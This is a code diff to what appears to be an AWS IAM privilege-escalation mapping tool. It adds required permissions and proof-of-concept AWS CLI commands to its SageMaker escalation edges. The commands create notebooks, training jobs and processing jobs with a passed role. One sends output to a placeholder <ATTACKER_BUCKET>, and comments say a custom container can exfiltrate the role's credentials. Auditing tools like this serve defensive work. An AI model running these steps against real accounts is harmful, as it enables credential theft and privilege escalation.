@@ -102,7 +102,13 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                     node_source,
                     node_destination,
                     '(MFA required) can use SageMaker to launch a notebook and access' if pass_needs_mfa or needs_mfa else 'can use SageMaker to launch a notebook and access',
-                    'SageMaker'
+                    'SageMaker (CreateNotebookInstance, PassRole)',
+                    ['iam:PassRole', 'sagemaker:CreateNotebookInstance'],
+                    [
+                        'aws sagemaker create-notebook-instance --notebook-instance-name pmapper-poc '
+                        '--instance-type ml.t2.medium --role-arn {}'.format(node_destination.arn),
+                        '# then open a terminal in the notebook instance (Jupyter) to use the role\'s credentials'
+                    ]
                 )
                 result.append(new_edge)
 
@@ -119,7 +125,16 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                     node_source,
                     node_destination,
                     '(MFA required) can use SageMaker to create a training job and access' if pass_needs_mfa or needs_mfa else 'can use SageMaker to create a training job and access',
-                    'SageMaker'
+                    'SageMaker (CreateTrainingJob, PassRole)',
+                    ['iam:PassRole', 'sagemaker:CreateTrainingJob'],
+                    [
+                        'aws sagemaker create-training-job --training-job-name pmapper-poc --role-arn {} '
+                        '--algorithm-specification TrainingImage=<IMAGE_URI>,TrainingInputMode=File '
+                        '--resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=5 '
+                        '--stopping-condition MaxRuntimeInSeconds=600 --output-data-config '
+                        'S3OutputPath=s3://<ATTACKER_BUCKET>/ '
+                        '# a custom training container image can exfiltrate the role\'s credentials'.format(node_destination.arn)
+                    ]
                 ))
 
             create_processing_auth, needs_mfa = query_interface.local_check_authorization_handling_mfa(
@@ -135,7 +150,14 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                     node_source,
                     node_destination,
                     '(MFA required) can use SageMaker to create a processing job and access' if pass_needs_mfa or needs_mfa else 'can use SageMaker to create a processing job and access',
-                    'SageMaker'
+                    'SageMaker (CreateProcessingJob, PassRole)',
+                    ['iam:PassRole', 'sagemaker:CreateProcessingJob'],
+                    [
+                        'aws sagemaker create-processing-job --processing-job-name pmapper-poc --role-arn {} '
+                        '--app-specification ImageUri=<IMAGE_URI> --processing-resources '
+                        'ClusterConfig={{InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=5}} '
+                        '# a custom processing container image can exfiltrate the role\'s credentials'.format(node_destination.arn)
+                    ]
                 ))
 
     return result
